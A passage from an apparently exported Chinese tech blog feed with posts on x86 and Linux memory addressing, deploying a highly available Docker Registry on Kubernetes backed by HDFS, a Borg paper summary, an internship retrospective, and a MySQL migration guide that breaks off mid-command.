引入分页机制后，通过段机制转换得到的地址仅仅是一个中间地址——线性地址，线性地址还需要通过页机制来转变成实际的物理地址。总结一下内存寻址过程，程序中使用的逻辑地址到最后的物理地址的转换过程： 1逻辑地址 --&gt;(分段机制) 线性地址 --&gt;(分页机制) 物理地址 内存寻址过程分析 简单的介绍了一下操作系统内存寻址的发展历程，接下来细致的分析一下分段和分页机制内存寻址的过程。首先先简单的说下逻辑地址、线性地址、物理地址的概念： 逻辑地址：程序代码中一个操作数或者一条指令的地址 线性地址：虚拟地址可映射 4G 内存空间（分页机制的产物，逻辑上连续） 物理地址：处理器的引脚发送到内存总线上的电信号相对应 分段机制详解 代码中使用到的逻辑地址由两部分组成： 段选择符: 16 位长的字段 段内偏移地址：32 位长的字段（最大的段大小为 4GB） 为了快速找到段选择符所指定的段的位置，处理器提供了段寄存器（cs、ss、ds、es、fs、gs），相比于 8086 来说，80386 新增了 fs、gs 附加段寄存器，主要是为了减少 es 这个寄存器的负担引入的。 值得注意的是 cs 寄存器，它含有一个 2 位的字段，用以指定当前 CPU 的特权等级 DPL，3 为用户态，0 为内核态。 段描述符 前面说到段选择符是一个 16 位的字段，格式如下： 15 ~ 3 位：Index 索引号 2 位：TI 标志，指明段描述符在 GDT（TI=0）中或者 LDT（TI=1）中 1 ~ 0 位：RPL 标志，请求者的特权级 由段选择符中的索引号可以索引到段的信息，段的信息是由8字节的段描述符表示，段描述符存放在全局描述符表（GDT）和局部描述符表（LDT）中。同样 GDT 和 LDT 的地址也是存放在寄存器中的，通常系统初始化的时候会初始化 gdtr 控制寄存器，写入 GDT 表的地址，如果每个进程除了存放 GDT 外，还需要自己的附加的段，就可以创建一个 LDT，将 LDT 表的地址写进 ldtr 寄存器中。 快速访问段描述符 因为段寄存器中存放的只是段选择符的地址，由段选择符来索引实际的段描述符还需要查找 GDT 或者 LDT 表。为了加速逻辑地址到线性地址的转换过程，80x86提供了一种附加的非编程寄存器，即每当一个段选择符装入寄存器时，相对应的段描述符就由内存装入到这个非编程寄存器中。 这样当针对那个段的逻辑地址转换线性地址时，就不用访问 GDT 或者 LDT 表，直接引用存放这个段描述符的非编程寄存器就好了。 分段机制下地址转换的过程 一个逻辑地址由段选择符和段内偏移组成，在转换成线性地址时，分段单元执行以下操作： 先检查段选择符的 TI 字段，判断这个段的段描述符是存放在 GDT 中还是 LDT 中 然后由段选择符中的 Index 索引到实际的段描述符 将 Index 索引到实际的段描述符的地址✖️8，再加上 gdtr 或者 ldtr 寄存器中的值。这个过程就完成了段起始的位置的计算 最后把计算的结果加上逻辑地址中的段内偏移就得到了线性地址 Linux中的分段 Linux 以非常有限的方式使用分段，更偏向使用分页的形式管理内存，因为： 当所有进程使用相同的段寄存器时，内存管理将变得简单，也就是说它们可以共享同一组线性地址 Linux 的设计目标是可以移植到大部分平台上，然而 RISC 对分段支持有限 在 Linux 运行在 80x86 平台上使用到了分段机制，并通过定义四个宏来定义相应的段选择符 __USER_CS ：用户态代码段选择符 __USER_DS : 用户态数据段选择符 __KERNEL_CS ：内核态代码段选择符 __KERNEL_DS : 内核态数据段选择符 也就是说对内核代码段寻址时，只需要将 __KERNEL_CS 的值装入 cs 段寄存器即可，其中 cs 段寄存器中的段选择符所指定的 RPL 值，表明了当前进程是属于用户态还是内核态。 对于 GDT 表来说，在 Linux 中每个 CPU 对应一个 GDT 表，所有的 GDT 都存放在 cpu_gdt_table 中，而 GDT 的地址和它们的大小，则存放在 cpu_gdt_descr 数组中，这些都将在系统启动之前初始化。 分页机制详解 前面提到分页机制是为了配合操作系统中的虚拟内存管理而引入的，分页机制目的是为了将线性地址转换成物理地址。 基本概念 简要讲述一下页、页框、页表的概念 页：对应着线性地址，线性地址被分成以固定大小为单位的组，称为页，页大小一般为4K 页框：对应着物理地址，物理地址也就是 RAM，被分成固定大小的页框，每个页框对应一个实际的页 页表：用来将页映射到具体的页框中的数据结构 常规分页 因为每个页的大小为 4KB，为了映射 4GB 的物理空间，页表中将会有 1MB（2^20） 的映射项，对应每个程序来都要保存一个这么大的页表项是难以接受的，所以引出了多级页表的概念，也称为页目录。 也就是说线性地址的转换过程需要两步，首先是查找页目录找到具体的页表，然后查找页表，找到具体的页。如果这个页不存在 RAM 中，即缺页，还会引发缺页中断，申请调页；如果存在 RAM 就可以完成线性地址到具体物理地址的转换了。 分页机制中每个活动进程必须有一个页目录，不必为进程的所有页表都分配 RAM，只有实际使用到时才分配，这样才会更有效率，进程正在使用的页目录地址存放在 cr3 寄存器中。 线性地址字段分析 线性地址分成3部分，如下所示： Directory：决定页目录中的目录项，10位大小 Table：决定页表中的表项，10位大小 Offset：页框的相对位置 因为 Directory 和 Table 字段都是 10 位大小，所以页目录项和页表都多达 1024 项。页目录和页表的数据结构类似，都包含着下面字段： Present标志：1（页在主存中）0（不在主存，引发缺页中断） Accessed标志：每当分页单元对相应页框寻址时就设置这个标志 Dirty标志：只应用于页表项，每当对一个页框进行写操作时就会设置这个 Read/Write标志：含页或页表的存取权限 User/Supervisor标志：含有访问页或页表的特权级 PCD和PWT标志：控制硬件高速缓存处理页和页表的方式 Page Size标志：只用于页目录项，如果设置为1，那么页框的大小为2MB或者4MB Global标志：只用于页表项，防止常用页从 TLB 高速缓存中刷新出去 转换后援缓冲器 TLB 除了内部的硬件高速缓存外，还包含了一个转换后援缓冲器 TLB 的高速缓存用以加快线性地址的转换。当一个线性地址第一次使用时，通过慢速访问 RAM 中的页表计算出相应的物理地址，同时物理地址被存放到 TLB 的表项中，以便下次对同一个物理地址的引用可以快速的得到转换。 在多处理器中，每个 CPU 都有自己的 TLB。当 CPU 的 cr3 寄存器被修改时，那么 TLB 的所有项都变得无效了，因为当前使用的是新的页目录了。 Linux中的分页 两级页表对 32 位系统是足够了，但为了支持 64 位系统，还需要引入多级页表，Linux 从 2.6.11 版本开始引入四级页表： 页全局目录 页上级目录 页中间目录 页表 对于没有启用物理地址扩展的 32 位系统，两级页表已经足够了，这时通过将页上级目录和页中间目录位全部置0，从而保持了两级页表的格式。 在内存初始化阶段，内核必须建立一个物理地址映射来指定哪些物理地址范围对内核可用，哪些不可用。内核将以下页框记为保留： 在不可用的物理地址范围的页框 含有内核代码和已初始化的数据结构的页框 保留页框的页决不能被动态的分配或交换到磁盘上。进程的线性地址空间分成2个部分： 从 0x00000000 到 0xbfffffff 的线性地址，无论线程运行在内核态还是用户态都可以寻址 从 0xc0000000 到 0xffffffff 的线性地址，只有内核态线程才可以寻址]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于kubernetes的Docker Registry的高可用部署]]></title>
    <url>%2F2017%2F04%2F14%2F%E5%9F%BA%E4%BA%8Ekubernetes%E7%9A%84Docker-Registry%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[写在前面 在kubernetes集群中运维生成环境的服务已经长达半年多时间，我们遇到了很多问题，也踩到了很多坑，其中因为 Docker Registry 的故障而导致的不可用事件还是挺多的，这些问题常常被用户埋怨。 Docker Registry 作为镜像仓库、数据中心，在整个服务发布流程中是异常关键的一环。由于之前初期我们搭建的 Docker Registry 是通过 docker run 跑在单机的方式，这种情况下不仅有单点问题，还面临着磁盘损坏和镜像丢失的危险性。 后来为了提高平台的稳定性和可靠性，也为了我的毕业论文，特地的花时间来调研 Docker Registry 的部署和设计方案，这个方案不仅采纳了开源社区和其他公司的部署策略，同时也结合了本公司内部的基础上而设计的一套高可用的 Docker Registry 方案。 调研初期 在2017年3月份时候有幸参加了 ebay 公司举办了亿贝TechDay活动，在这次公开技术分享中，我不仅见识了由DaoCloud技术合伙人孙宏亮大神所分享的Docker安全思考，也同时领略了其他公司关于kubernetes、关于docker、关于registry的思考和尝试。 携程、京东的 Docker Registry 的部署过程中，都用到了一个harbor的开源镜像管理软件，这是我第一次接触这个项目。后面我们的 Docker Registry 部署方案的设计中也同时采用了 harbor 这个开源项目。 Docker Registry 的后端存储 在 harbor 这个开源项目中，默认的 registry 是以 replication controller 的形式部署在 kubernetes 上的，采用 persistent volume 作为 registry 的后端存储。存在的问题是：即使增大 registry 的副本数，这些 registry 后端存储的仍是同一个本地的文件路径 “host path”，这种形式下仍旧存在单点问题，造成镜像文件的丢失。 所以目前存在的问题是多个 Docker Registry 如何共享后端存储？网上的实现方式有很多，比如 NFS、GlusterFS、CephFS 等。相对于使用这些分布式系统，我们内部有现成的一套 HDFS 分布式文件系统，但有个问题是 kubernetes 本身是不支持 HDFS 文件系统作为它内部的 volume 的，这就造成了如何在 kubernetes 部署 Docker Registry 集群造成一定的困难。 变通与使用 HDFS 我们的办法是使用 kubernetes 内部支持的 host path 的形式作为每个 registry 的后端存储，最关键的一步是将这些 host path 全部挂载到 HDFS 的同一个目录，这样就可以实现多个 registry 共享同一套后端存储，既解决了 registry 的单点问题，又保证了镜像仓库的可靠性。 挂载 HDFS 的目录 我们先选好三台机器作为 Docker Registry 的部署机器，分别打上标签 123kubectl label node node1.X.com registry=truekubectl label node node3.X.com registry=truekubectl label node node4.X.com registry=true 其次分别登录到这些机器上，建立一个目录作为 registry 的存储位置 1mkdir -p /home/work/hdfs/docker/images 然后把这个目录挂载到预先建立好的同一个HDFS目录上，挂载方式是通过执行 hadoop client 里的挂载脚本，过程如下 123456local_dir=/home/work/hdfs/docker/imagesremote_dir=/user/X/docker/imageshostname=nj02-rp-nlpc-zk00.nj02.X.comport=54310sh ./hadoop-client/hadoop-vfs/bin/mount.sh $hostname:$port:$remote_dir $local_dir 最后的效果就是这三个节点的 /home/work/hdfs/docker/images 路径全部挂载到了 HDFS 的 /user/X/docker/images 目录上。 镜像迁移 由于我们集群上仍旧运行着很多服务，为了不影响服务的变迁过程，我们在搭建新的 registry 集群的时候，需要将原有的仓库迁移过去。迁移办法很简单，通过脚本方式完成，缺点是比较耗时： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import osimport jsonimport urllib2import subprocessimages_list = []# 源仓库地址source_registry = 'registry.sofacloud.baidu.com'# 目的仓库地址target_registry = '10.254.60.41:5000'try: images_list = json.load(urllib2.urlopen('http://' + source_registry + '/v2/_catalog'))['repositories']except Exception as e: print 'get images list from source registry: ' + source_registry + ' Error: ' + str(e) exit(0)def get_image_tag(registry, image): #url = 'http://registry.sofacloud.baidu.com/v2/' + image + '/tags/list' url = 'http://' + registry + '/v2/' + image + '/tags/list' tags = [] try: #tagInfo = urllib2.urlopen(url, timeout = 3).read() tags = json.load(urllib2.urlopen(url, timeout = 3))['tags'] except Exception as e: print 'get images ' + image + ' tags error. Error : ' + str(e) return tags# get images infotarget_images_info = &#123;&#125;source_images_info = &#123;&#125;for image in images_list: print 'get image : ' + image + ' tags info' target_images_info[image] = get_image_tag(target_registry, image) source_images_info[image] = get_image_tag(source_registry, image)# make a diffdiff_images = []for image in source_images_info: if image not in target_images_info: print 'image : ' + image + ' not found in target image repo' continue target_tags = target_images_info[image] source_tags = source_images_info[image] for tag in source_tags: if tag not in target_tags: diff_images.append(image + ':' + tag) print 'image : 10.254.60.41:5000/' + image + ':' + tag + ' is diff'# begin to syncfor image in diff_images: target_image = source_registry + '/' + image print 'begin to pull image ' + target_image try: retcode = subprocess.call(['docker', 'pull', target_image]) if retcode != 0: print 'image ' + target_image + ' pull failed' continue # tag new image new_image = target_registry + '/' + image print new_image retcode = subprocess.call(['docker', 'tag', target_image, new_image]) if retcode != 0: print 'image ' + target_image + ' tag failed' continue # push new image retcode = subprocess.call(['docker', 'push', new_image]) if retcode != 0: print 'image ' + target_image + ' tag failed' except Exception as e: print "image : " + image + " sync failed. Error: " + str(e) 注意 target_registry = '10.254.60.41:5000' 是 kubernetes 临时搭建的镜像仓库地址，不过后端存储使用的是 HDFS 上的镜像仓库目录 /user/X/docker/images kubernetes 上部署 在 kubernetes 上拉起三个 registry 集群的配置文件: Config Map 的配置文件 registry.cm.yaml 内容如下 12345678910111213141516171819202122232425262728293031323334353637apiVersion: v1kind: ConfigMapmetadata: name: harbor-registry-config namespace: harbordata: config: | version: 0.1 log: level: debug fields: service: registry storage: filesystem: rootdirectory: /storage cache: layerinfo: inmemory maintenance: uploadpurging: enabled: false delete: enabled: true http: addr: :5000 secret: placeholder debug: addr: localhost:5001 notifications: endpoints: - name: harbor disabled: false url: http://ui/service/notifications timeout: 3000ms threshold: 5 backoff: 1s cert: | Replication Controller 配置文件 registry.rc.yaml 内容如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445apiVersion: v1kind: ReplicationControllermetadata: name: registry-rc namespace: harbor labels: name: registry-rcspec: replicas: 2 selector: name: registry-apps template: metadata: labels: name: registry-apps spec: restartPolicy: Always nodeSelector: registry: "true" containers: - name: registry-app image: registry.sofacloud.X.com/public/registry:2.6 imagePullPolicy: IfNotPresent ports: - containerPort: 5000 hostPort: 8988 - containerPort: 5001 hostPort: 8989 volumeMounts: - name: config mountPath: /etc/docker/registry - name: storage mountPath: /storage volumes: - name: config configMap: name: harbor-registry-config items: - key: config path: config.yml - key: cert path: root.crt - name: storage hostPath: path: /home/work/hdfs/docker/images 然后创建 registry 集群 12# kubectl create -f registry.cm.yaml# kubectl create -f registry.rc.yaml Registry 镜像仓库的负载均衡 kubernetes 上我们已经搭建了三个 registry 实例，它们共享同一套后端存储，统一把镜像文件存储到 HDFS 集群上，这样保障了镜像仓库的可靠性。为了用户更好的使用这些 registry，还需要为这三个 registry 增加一个负载均衡器。 本文三个 registry 部署的情况如下： 123hostA:8989hostB:8989hostC:8989 可以选用 nginx + keepalived 实现高可用的负载均衡器，不过为了安全起见，我们是在公司内部申请了一个虚拟的 VIP 来映射三个 registry 的部署端口，从而实现负载均衡的功能。 最后 经过这次成本很低的简易改造，大大的提高了 registry 镜像仓库的可靠性和稳定性。]]></content>
      <tags>
        <tag>docker</tag>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Borg论文解读]]></title>
    <url>%2F2017%2F01%2F14%2FBorg%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB%2F</url>
    <content type="text"><![CDATA[背景简介 组里目前支持了一个非常重要的业务，为了支持业务快速的扩展，更好的进行产品维护，决定成立一个虚拟化学习小组。主要宗旨就是为了提升大家对虚拟化、资源管理这方面知识的理解，共同调研生产环境下关于资源虚拟化方面的主流解决方案 Borg论文解读 先贴上原文的地址：http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43438.pdf 这里先做一下论文的简要梳理，然后对比一下开源平台kubernetes Borg简介 Borg是什么呢？它是Google公司的大规模分布式的集群管理系统，负责管理、调度、运行和监控公司绝大部分的应用程序和框架包括Gmail、Google Docs、Web Search这样的应用程序，也包含一些底层的框架Map Reduce计算框架、GFS分布式的存储系统、Big Table。主要是解决了这么几个问题 隐藏了资源管理和故障处理细节，使其用户可以专注应用开发 支持应用程序做到高可用和高可靠 提升了资源利用率，有效的降低了成本 整体框架 整体来看，Borg是一个典型的分布式平台架构，每个节点部署一个代理（Borglet），统一由BorgMaster来管理这些节点的运行情况。同时对外部而言，Borg提供了命令行和Web UI的方式访问Borg系统，提交任务或者申请资源。这些请求会发送到BorgMaster那里，然后由BorgMaster来决定后续的操作，下面是Borg的基本架构图 一套由BorgMaster和Borglet部署的Borg环境称为cell，一个IDC可以部署多个cell。一般来说为了防止单点问题存在，每个cell都要由五个BorgMaster组成，它们通过paxos协议进行选主和同步，所有的写操作都要由leader来执行。BorgMaster要定期轮询所有Borglet节点的状态，如果机器规模很大的情况下就会造成负载过重，因此Borg系统将轮询工作平摊给每个BorgMaster的follower处理，只有Borglet的状态发生变化时，才会通知leader处理。 为了减少BorgMaster的压力、灵活的迭代调度器的模型，Borg系统融入了omega的设计，将调度器scheduler作为一个独立的服务拆分出来了~ 下面梳理一下调度器方面的细节 Borg的调度器 决策调度的过程主要涉及到以下两个方面：适用性(feasibility checking)和最适合(scoring) 适用性：是指找到哪些机器能够负载（运行）这个任务 最适合：是指在这些适合的机器中，按照一定的打分策略选择分数最高的那个 适用性估量 Borg会对每个任务Task做了一个资源上的估量，下图是一张资源限制图的说明： 最外层的那个虚线是这个Task的配额，这是一个硬性的限制，如果超过了这个限制，这个Task是无法运行起来的。实际生产环境中，对一个Task实际需要多少资源是很难估量的，所以Borg提出了一种资源回收的解决方法，它在Task启动300秒之后，就会进行一个资源回收的工作，上图中黄色区域是程序实际使用的资源，然后Borg会从外围的硬限制资源区域慢慢向里推进，直到推到一个安全的区域，那么剩下的资源Borg可以重新利用起来。 绿色区域的那个范围是一个动态的过程，Borg会隔几秒就会重新计算一下应用程序耗费了多少资源。为了更合理的进行回收资源的过程，它对应用类型做了区分，分成生产型的应用（prod task）和非生产型的应用(non-prod task)，这些概念会在一下章节中提及。 最适合 根据Task的资源估量，来选出哪些机器可以负载这个Task，然后通过一些打分策略，选择分数最高的机器来运行这个Task。目前有2种打分模型一种是考虑负载均衡，将负载平均分配到所有机器上，这样做的代价是增加了碎片，对于那些需要大部分的机器的Task来说，是很难获取到足够的资源的，论文中也称为最差匹配策略。 还有一种相对应的分配策略称为最佳匹配：就是把机器塞的越满越好，这样能够一下一批空闲的机器给用户。这样的策略对那些资源预估不足的用户来说，是很不友好的，比如用户的Task负载突然升高将会大大降低Task的服务质量。 Borg论文里使用的是两种方式混合的，试图减少碎片资源。还有一个比较明显的特征是如果一些高优先级的任务没有找到合适的资源来运行服务时，就会试图驱除一些低优先级的任务来达到释放资源的目的。 启动延迟（Task从提交到真正运行起来）是一个比较关注的问题。Borg为了减少Task的启动时间，scheduler希望机器上已经有足够的包(程序和数据)：大部分包是只读的所以可以被分享和缓存。 任务类型 运行于Borg系统之上的应用主要分成两类，一类称为prod task：启动后作为一个服务存在，长时间不断接受并处理收到的请求。这类任务对请求处理延迟和可用性比较敏感，多数服务于终端用户（比如Gmail、Google Docs等）这些应用也称为在线服务。另一类应用称为non-prod task，这类任务执行结束后自行退出，对执行时间和执行失败不那么敏感，也可称这些服务为离线作业。 对任务类型进行区分有很多好处，因为这两种负载的差异性比较大，不能以相同的调度策略来对待。对任务类型进行区分一方面可以优化调度策略（prod任务可以通过抢占non-prod任务来提高服务的可用性），一方面可以针对任务类型来进行相应的优化（对prod任务来说需要关注的是可用性，对non-prod来说系统的整体吞吐才比较重要） 服务发现和命名机制 光是创建和部署task是不够的：一个服务的客户端和其他系统需要能找到它们。为了实现这一点，Borg內建了一个Borg Name Service的系统，这个系统将Task的主机名、端口、属性等信息写入到一个持久化高可用的文件里，以BNS为文件名放在Chubby中，通过访问这个文件的形式来发现Task的地址。 每个Task都会有一个内置的HTTP服务，用来健康检查和收集各项性能指标信息，并通过Dashboard来展示出来。为了防止某些Task运行中产生大量的日志塞满磁盘，Borg会自动的滚动这些日志信息，会在Task结束后保留一小段时间用来调试。 为了提升资源利用率，Borg的做法 Borg集群支持混布（离线作业和在线作业在一起调度）：为了实现这一点，Borg首次使用cgroup技术进行物理资源隔离。这个工作是后续众多容器技术的基础，早期的lxc以及后续的docker都得益于Google的贡献 Borg支持优先级调度，支持抢占、支持超发：Borg上运行的任务都需要指定具体的优先级，主要分成四种任务：基础业务（monitoring）、在线业务（production）、离线计算（batch）、best-effort。best-effort是在机器利用率低峰期跑一些任务，不会保证任务的可靠性，这样可以大大提升集群整体的资源利用率。对于抢占策略，一般是高优先级抢占低优先级，不过对于production和monitoring来说是不可被抢占的。 在系统运行的过程中，会出现这种情况：用户往往会多申请一部分资源，以确保服务压力突增时有一定的冗余空间。如果在分配资源时，以用户的请求值来实际的分配资源，那么就会导致集群累积大量的闲置资源。为此，borg提出 reclaimed-resource的概念解决这个问题（over-commit思想）。 简单通过来说，如果节点有 100 的物理资源，这时候先以monitor/ production优先级申请 60，但是实际只使 40，那么这个节点就出现 (60-40)=20 的闲置资源(reclaimed-resource)。borg的处理思想是，当来有个batch/best-effort优先级的资源需求的时候，那么就认为这台机总共有（100+20=120）、还剩（120-60=60）的可分配资源， 对于monitor/production优先级的请求来说，则认为节点还有（100-60=40）的可分配。 这种分配方式，确保在单机上分配给monitor/production级别任务的资源之和不会超过真实物理资源。当monitor/production级别的资源，增加到其申请的配额数的时候(比如服务器压力突升)，可以通过抢占低优先级任务来满足其需求。通过这种资源超发机制，大大提高了资源利用率。 Borg的经验和教训 Job是唯一的Task分组机制，无法很好的标识服务间的关系，因此Borg无法很好的管理多个Job组成的单个服务。为了避免这些困难，Kubernetes不用job这个概念，而是用标签(label)来管理它的调度单位(pods)，标签是任意的键值对，用户可以把标签打在系统的所有对象上。Kubernetes用标签选择这种方式来选取对象，完成操作。这样就比固定的job分组更加灵活好用。 每台机器只有1个IP把事情弄复杂了，这种策略将端口和IP作为资源参与到Task调度中去了，对于Task的发起者也要事先声明一下需要的端口。Kubernetes可以用一种更用户友好的方式来消解这些复杂性：所有pod和service都可以有一个自己的IP地址，允许开发者选择端口而不是委托基础设施来帮他们选择，这些就消除了基础设置管理端口的复杂性。 Borg与Kubernetes的对比 Kubernetes是一个开源的容器集群系统，为容器化的应用提供资源调度、部署运行、服务发现、扩容缩容等整一套功能。kubernetes与Borg非常类似，是Borg的一个开源实现。Borg底层是lxc容器，而kubernetes支持不止一种容器类型，默认是docker容器，还支持着rocket容器。Borg是C++编写的，而kubernetes则是Go语言编写的，Borg在集群调度性能上做了很多的优化，但是kubernetes对于调度这块没有做过多的优化措施，仅仅是一些机器适用性的选择。Borg可以支持上万的集群规模，而kubernetes支持的机器数有限，千台左右。 Kubernetes可以说是Borg的简化版的实现，它虽然不能像Borg那样支持超大规模的集群、无法使用优秀的调度策略，但是它弥补了很多Borg设计之初的不足。比如细分了任务的类型，通过Pod形式作为一个服务的管理单位；其次kubernetes将资源隔离交给基础容器去做，为每一个服务单独赋予一个IP，而不是像Borg那样，一个机器上的所有应用共享本地的IP和端口，这导致端口成为资源调度的一部分，复杂了资源管理的过程。]]></content>
      <tags>
        <tag>论文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实习半年的总结]]></title>
    <url>%2F2016%2F12%2F07%2F%E5%AE%9E%E4%B9%A0%E5%8D%8A%E5%B9%B4%E7%9A%84%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[关于工作 从6月8号开始实习，到现在近半年了。回想这半年的生活过得像研一的时候，每天早晨9点起床，晚10点半回家，不过唯一值得欣慰的是每周有2天可以放松一下，而且有工资加上学校的补助，过得还是挺好的。在这里技术氛围比较浓厚，没有明显的等级观念，唯一不太好的就是大家都比较忙，很难有时间、有兴趣聊聊自己喜欢的事情，很少有机会大家一起出去聚聚，加深感情。 这半年来时间过得很快，成长的也很快，认识了很多优秀的朋友、同学，偶尔也能听到资深大牛的经验之谈，我还是很幸运的。下面总结一下自己半年的所得吧 关于职责 这半年来主要做的工作： 1、docker &amp; kubernetes的调研 2、kubernetes集群 &amp; MPI集群的运维 3、公司内部一个DNN文本计算平台的前后端开发 4、一个PaaS平台的后端开发 虽然很多事情都是修修补补的小事，但在这个过程中，也渐渐熟悉了软件开发的流程和运维经验，并且熟悉了内部平台的一些架构设计理念 关于运维 记得刚来的时候我做了大概2个月的运维工作，主要是关于docker &amp; kubernetes的调研、集群搭建、稳定性测试工作，渐渐地熟悉了docker和kubernetes的使用和常见问题的处理方法。后来小组决定搭建一个高可用的kubernetes集群加进我们的平台中，在搭集群的时候遇到的坑虽然不少，学到的确实很多 对kubernetes整体架构有个更清晰的认识 熟悉了etcd的使用，对服务间的通信理解更上一层楼 懂得了高可用的概念和解决方案 关于开发 我入职大概2个月之后才开始接触项目开发的，第一个接手的项目是一个DNN文本计算平台，通过这个平台用户可以很方便、快速的进行一次深度学习模型的训练。这个项目整体是Python开发的，感觉是因为内部人使用的，可能有些代码质量可能不太好…在这个过程中总结一下自己所得 熟悉了Django开发框架 熟悉了MongoDB，明白为啥这个项目选用MongoDB作为它的数据库，而不是mysql，因为这个项目需要保存很多非常复杂的配置信息，MongoDB更加适合 熟悉了前端开发流程，哈哈感觉自己是个半吊子前端…学会使用ajax和jQuery 理解了master -&gt; client -&gt; slave 三段式的架构类型 最近这段时间又处于到另一个平台的后端研发中了，这是个PaaS平台，它支撑着公司内部很多非常重要的服务。目前为这个平台所做的贡献就是一个Dashboard，它提供一个资源使用的前端页面，可以详细的查询到每个实例、服务、机器的资源使用情况，它同时也是整个平台的资源展示、监控报警、自动扩容缩容的入口。我主要做了数据采集和数据查询接口的开发，另一位同学主要负责前端展示，在另一位同事的指导下我们不断优化这个平台，目前可以做到30s内的实时查询，这个过程中也获益匪浅 熟悉了Golang语言的使用 熟悉了Cache的概念 实际的参与到一个软件的开发和优化过程 关于上线 来这么久了，也上线了很多次了，到目前为止一共出现了2次比较严重的事故。第一个是关于DNN文本计算平台的，第二个就是Dashboard，上线失败回滚的过程还是和痛苦的，得到的经验和教训就是一定要做好备份工作。无论线下环境测得多么仔细，应用到线上的时候还是有几率出问题的。在这个过程中还学会了一套比较安全的项目部署方式，简称双Buffer，具体过程如下： 1、有两套完全一样的后端环境A和B，它们连接同一个数据库 2、上线时先把A升级了，前端切到后端A，然后测试一下是否符合预期 3、如果一切Ok的话再升级B后端，保证A和B一致性 4、如果A升级后发现问题需要回滚，那么前端直接切到B后端，这样可以大大减少上线失败的影响 还有一种上线方式是小流量上线，应用比较广泛。假如一个组件或者服务有多个实例，那么先升级一部分实例，测试升级后的这部分实例是否符合预期，如果OK的话就全部升级，如果不符合预期的话可以大大减弱上线失败的影响的 关于微服务架构 微服务应该是目前比较火的概念吧，主要思想是把程序中的一些组件、模块抽离出来做成一个服务的形式，而不是传统那样的lib库。至于微服务化的好处，我所理解的有以下几点： 减少代码冗余 举个常见的例子吧，像很多项目中都会用到与数据库打交道的DAO，每个模块间可能都会跟数据库打交道，比如查询、更新等，那么就需要把这些DAO分发给不同的模块，这样就造成代码的冗余。假说说我们的DAO规范变了，如果项目多的话修改起来还是很麻烦的。 而微服务架构的理念是可以尝试把这个DAO封装成一个服务的形式，它对外提供增删查改等接口 保证环境的一致性 在运维部署过程中，经常被运行环境搞的焦头烂额，不是少了一个环境变量就是一个库没引用。。还要就是实例升级的时候不知道每个实例代码是否一致，比如有时候在线下环境测试的好好的，到线上就出问题了。这个环境封装一般是容器做到的，在这里不得不感叹一下容器技术的出现和应用真的会大大减少运维成本 跨语言开发 这个就是个显而易见的好处啊，试想有些语言比较适合数据处理、有些语言适合通信过程处理，有些则适合并行，如果把这些功能模块做成一个服务、规范接口，这样既可以分散开发、减少代码的复杂性，又可以利用每个语言的优点 关于docker 这里还是不得不说下docker的，虽然我没有看过docker的源码，但在生成环境中运维了3个月左右时间的docker集群（kubernetes），对kubernetes集群和docker环境熟练了不少。每一次踩坑的时候，都是自己学习进步的好机会。 如果docker容器技术成熟了，或者说我们团队对docker技术非常熟悉的情况下，全面使用docker容器来进行生产环境的部署还是能带来非常大的收益的。前面也提到了docker容器技术所带来的优势，目前我开发和维护着2个项目，运维成本是非常高的，一天下来大部分时间都花在了运维上面。与人打交道、为用户解决各种疑难杂症，实际用在开发的时间还是比较少的。 如果让我说选用docker容器的理由的话，一定是可以保持环境的一致性。比如说一个项目分为好几个模块（服务），每个服务又有多个实例，每个服务间可能会共用相同的代码部分，假如说升级了其中一个服务，修改了这些共用的代码部分，其他服务也需要修改，如果改动很频繁的话，就很容易造成服务间共用的代码不一致情况，非常蛋疼的一件事。 最后 到现在为止已经整整实习半年了，有时候也会想要不要换个环境实习一下呢？多接触一些人，多接触一些项目？但想想还是放弃了这个念头，静下心来，把手中的东西做好，毕竟这边还是有很多地方值得自己学习的，想着自己要2017年年底才能毕业，还有实习近1年的时光，心都碎了。。。。想念紫色风铃声，绝不会打扰第三次了。。。]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据迁移]]></title>
    <url>%2F2016%2F08%2F15%2FMySQL%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB%2F</url>
    <content type="text"><![CDATA[数据库的导入导出 我们此次准备迁移的共有五个数据库，分布在三台机器上： 12345$HOSTNAME_0 $DATABASE_0$HOSTNAME_1 $DATABASE_1$HOSTNAME_2 $DATABASE_2$HOSTNAME_2 $DATABASE_3$HOSTNAME_2 $DATABASE_4 首先我们需要将这些数据库通过 mysqldump 的方式导出，其用法如下： 1mysqldump –h$HOSTNAME –u$USER –p$PASSWD $DATABASE &gt; $DATABASE.sql 通过这种方式就可以将 $DATABASE 的数据以 SQL 语句的形式保存在文件中。有一些非常有用的选项，可以帮助我们更好的操作数据库： -t 表示仅导出数据库中的数据，不包括表结构 -d 表示仅导出数据库的表结构，不包含数据 问题：mysqldump 备份数据出现段错误 可能原因:是待备份的数据库中包含视图 解决办法：备份的时候跳过这些视图，–skip-tables=$TABLE_VIEW 搭建MySQL主从备份 准备工作 以 $DATABASE_0 数据库为例，我们目标是以 $HOSTNAME_0 为 master，搭建两台 slave 以同步 master 数据库的数据，从而实现主从备份。其中两台 slave 主机如下： 12$HOSTNAME_SLAVE_0$HOSTNAME_SLAVE_1 为了保证主从同步正常进行，我们需要确保 slave 主机的 MySQL 环境要与 master 主机的 MySQL 环境一模一样，并且要在配置文件 my.cnf 中添加log-bin=mysql-bin选项。由于我们机器上的 MySQL 都是通过公司内部的 jumbo 安装的，所以确保环境配置相同的问题其实不用考虑的，唯一需要确保的是 slave 的 my.cnf 中的 server-id 要与 master 的 my.cnf 中的 server-id不相同，否则同步出错 数据导入 首先我们在 slave 数据库中建立 $DATABASE_\0 这个数据库，然后通过之前 mysqldump 出来的数据导入到这个数据库中，操作如下： 1mysql –h$HOSTNAME 